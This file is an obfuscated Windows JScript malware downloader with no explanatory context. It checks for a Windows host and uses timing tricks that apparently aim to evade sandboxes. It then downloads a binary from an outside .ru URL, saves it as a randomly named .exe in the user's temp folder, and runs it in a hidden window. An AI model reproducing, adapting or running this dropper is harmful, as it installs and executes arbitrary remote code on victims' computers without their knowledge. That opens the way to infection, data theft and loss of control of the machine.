var II = false;
var MW = "Create"+"Object";
var MB = function DY() {return WScript[MW]("WScript"+".Shell");}(), E0 = 11;
var MR = "MSXML2"+".XMLHTTP";
var D0 = 2;
var Y = D0 - 2;
function Z0(WC){MB["Run"](WC, Y, Y);};
function UQ(){return MR + "";};
function P0(XV, XN){Y = Y * 1; return XV - XN;};
function P(){return MW;};
/*@cc_on
  @if (@_win32 || @_win64)
    II = true;
  @end
@*/
if (II)
{
var D = "";
function RG(){return 22;};
var KS = 0; var MD = 0;
function S()
{
var QI = new this["Date"]();
var BR = QI["getUTCMilliseconds"]();
WScript["Sleep"](RG());
var QI = new this["Date"]();
var VZ = QI["getUTCMilliseconds"]();
WScript["Sleep"](RG());
var QI = new this["Date"]();
var M = QI["getUTCMilliseconds"]();
var KS = "A";
KS = P0(VZ, BR);
var MD = "O";
MD = P0(M, VZ);
D = "open";
return P0(KS, MD);
}
var SL = false;
var CX = false;
for (var PL = Y; PL < RG() * 1; PL++){if (S() != Y){
SL = true; 
MD = "31" + 11 * KS + MD; 
CX = true; 
break;
}}
function Z() {return ((SL == true) && (SL == CX)) ? 1 : Y;};
if (SL && Z() && CX){
function VX() {return MB["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "NjYukQAdYgJolGv.ex" + "e";};
 A0 = UQ();
 H = WScript[MW](A0);
 var S0 = 1;
do { 
	for (;S0;){
	try {
		if (S0 == 1)
		{
			H[D]("GET", "http://webkits.ru/mn3dka", false);
			H["send"]();
			YU = "Sleep";
			S0 = 2;
		}
		WScript[YU](RG() + 120); 
		if (H["readystate"] < 2 * 2) continue;
		S0 = Y;
		function E(CT) {var C = (1, 2, 3, 4, 5, CT); return C;};
		BD = WScript[P()]("ADODB.Stream");
		A0 = BD;
		A0[D]();
		A0["type"] = E(1);
		A0["write"](H["ResponseBody"]);
		BD["position"] = E(Y);
		A0["Save" + "ToFile"](VX(), 2);
		BD["cl"+"ose"]();
		T = VX();
		Z0(T);
	} catch(P1){};};
}while (S0);
}
}

